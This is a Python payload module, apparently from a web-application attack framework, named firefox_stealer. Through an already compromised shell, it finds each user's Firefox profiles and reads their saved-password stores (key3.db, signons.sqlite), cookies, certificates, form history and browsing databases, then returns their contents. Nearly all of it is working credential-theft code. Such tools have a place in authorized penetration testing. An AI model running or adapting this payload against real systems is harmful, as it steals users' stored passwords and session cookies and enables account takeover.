import re
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class firefox_stealer(base_payload):
    '''
    This payload steals Mozilla Firefox information
    '''
    def api_read(self, parameters):
        result = {}
        files = []

        files.append('bookmarks.html')
        files.append('content-prefs.sqlite')
        files.append('cookies.sqlite')
        files.append('cookies.sqlite-journal')
        files.append('downloads.sqlite')
        files.append('permissions.sqlite')
        files.append('key3.db')
        files.append('signons.sqlite')
        files.append('cert8.db')
        files.append('formhistory.sqlite')
        files.append('places.sqlite')

        def parse_mozilla_dir_path (profile):
            return re.findall('(?<=Path=)(.*)', profile, re.MULTILINE)

        users_result = self.exec_payload('users')
        
        for user in users_result:
            home = users_result[user]['home']
            
            mozilla_profile = home +'.mozilla/firefox/profiles.ini'
            
            profile_list = parse_mozilla_dir_path(self.shell.read(mozilla_profile))
            
            for directory in profile_list:
                for mozilla_file in files:
                    mozilla_file_fp = home+'.mozilla/firefox/'+directory+'/'+mozilla_file
                    content = self.shell.read(mozilla_file_fp)
                    if content:
                        result[mozilla_file_fp] = content

        return result
    
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
                
        if not api_result:
            return 'No firefox files were identified.'
        else:
            rows = []
            rows.append( ['Firefox file','Read access'] )
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename, 'Yes' ] )
                    
            result_table = table( rows )
            result_table.draw( 80 )
            return
